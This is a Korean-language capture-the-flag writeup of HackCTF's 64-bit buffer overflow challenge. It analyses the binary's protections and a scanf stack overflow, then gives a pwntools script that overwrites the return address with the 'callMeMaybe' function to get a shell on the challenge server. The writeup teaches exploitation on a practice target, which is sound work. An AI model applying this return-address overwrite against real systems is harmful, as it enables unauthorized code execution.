**HackCTF - x64 Buffer Overflow**

| layout | title                                 | auther   | categories | tags           |
| ------ | ------------------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - x64 Buffer Overflow Writeup | Y3oj4eng | writeup    | writeupwargame |



# Analysis

---

`file`명령어를 통해 바이너리의 정보를 획득한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file 64bof_basic 
64bof_basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=f36fc5ac99f79e7cfa367880978afc9a5b4367d7, not stripped

```

**기존에 풀어왔던 문제들과는 다르게 `64 bit` ELF 프로그램이다.**

`checksec` 모듈을 이용해 `binary`에 적용된 `mitigation`을 확인한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ checksec 64bof_basic 
[*] '/home/mac/Desktop/hackCTF/64bof_basic'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

오... `amd`기반의 구조이며 `RELRO`와 `NX` 보호기법이 적용되었다. (~~이전 문제들과는 다르게 험난할 것으로 예상된다.~~)

자, 일단 실행시켜본다!

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./64bof_basic 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

바이너리를 실행시키면 사용자로부터 입력을 받으며 입력을 받은 문자열을 `Hello` 문자열에 덧붙혀 출력한다.

한번의 분기도 없이 입력 -> 출력의 절차임으로 예상된다.

코드를 분석하기위해 `IDA`를 통해 바이너리를 열었다.

![image](https://user-images.githubusercontent.com/33051018/75684364-ff5b7b00-5cdb-11ea-93e7-c473903aea1c.png)

??? ``callMeMaybe` 라는 수상한 이름의 함수가 존재한다.

일단은 존재를 기억해놓고 `main`을 분석하도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75684545-57927d00-5cdc-11ea-8bfc-539ea501a597.png)

`main`의 구성은 정말 매우 간단했다.

`scanf` 함수를 통해 `s`변수에 값을 입력받는다. 

`strlen` 함수를 통해 `s`변수에 저장된 데이터의 길이를 확인하여 `v5`변수에 저장한다.

이후 `s`변수를 출력한다.

`s`변수는 메인함수의 베이스포인터인  `rbp`로 부터 `0x110`만큼 떨어진 곳에 위치하며 `scanf`함수를 통해 입력을 받기 때문에 `BOF` 취약점이 존재한다.

이를 통해 `main`함수가 끝날때 돌아가는 `return address`를 덮을 수 있다.

여기서 `return address`를 덮어씌우기 위해 쉘을 실행시켜줄만한 무언가가 필요한데, 

앞서 확인헀다시피 `NX` 보호기법이 적용되어 쉘코드를 기입할만한 영역이 마땅치않다.

아까 분석 초반에 확인했던 `callMeMaybe` 함수를 살펴본다.

![image](https://user-images.githubusercontent.com/33051018/75685876-a93c0700-5cde-11ea-89b7-7335081f3b89.png)

아주 좋은 함수다. ~~바람직~~

`scanf`함수가 끝나고 복귀하는 지점을 `callMeMaybe` 함수의 주소로 덮어씌워 `RIP`흐름을 조작한다.

# exploit

---

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3004)
#p = process('./64bof_basic')
callmemaybe_addr = 0x0000000000400606

payload = 'A'*0x118		# dummy : 0x110 + 8 (64bit SFP) bytes
payload += p64(callmemaybe_addr)

p.sendline(payload)
p.interactive()
```



